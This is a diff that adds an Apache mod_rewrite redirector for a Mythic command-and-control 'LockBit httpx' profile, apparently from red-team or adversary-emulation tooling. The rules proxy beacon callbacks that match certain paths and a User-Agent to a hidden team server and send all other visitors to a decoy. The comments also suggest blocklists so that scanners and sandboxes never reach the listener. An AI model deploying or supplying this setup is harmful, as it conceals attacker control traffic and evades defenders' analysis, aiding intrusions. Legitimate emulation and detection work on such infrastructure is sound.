@@ -1,0 +1,23 @@
+# Apache mod_rewrite redirector for the LockBit httpx profile.
+#
+# Generate the production version with threatexpress/mythic2modrewrite from your exported Mythic
+# payload config so the rules always match the profile. This hand-written version documents the
+# shape. Requires: mod_rewrite, mod_proxy, mod_proxy_http, mod_ssl, mod_headers enabled, and
+# `RewriteEngine On` in the vhost with `SSLProxyEngine On`.
+#
+# Replace MYTHIC_HTTPX_UPSTREAM (https://<mythic-ip>:<port>) and DECOY_URL.
+
+RewriteEngine On
+
+# Condition 1: request URI is one of the profile's callback paths
+RewriteCond %{REQUEST_URI} ^/(_next\.css|boards)$ [NC]
+# Condition 2: User-Agent matches the profile
+RewriteCond %{HTTP_USER_AGENT} "Chrome/120\.0\.0\.0 Safari/537\.36" [NC]
+# Both matched -> proxy to the team server (P = proxy, keep it invisible)
+RewriteRule ^.*$ MYTHIC_HTTPX_UPSTREAM%{REQUEST_URI} [P,L]
+
+# Anything that did not match both conditions -> bounce to a decoy (302)
+RewriteRule ^.*$ DECOY_URL [L,R=302]
+
+# Optional hardening: add GeoIP (mod_maxmind) and IP/UA blocklists to drop scanners and
+# sandboxes before they ever reach the listener.
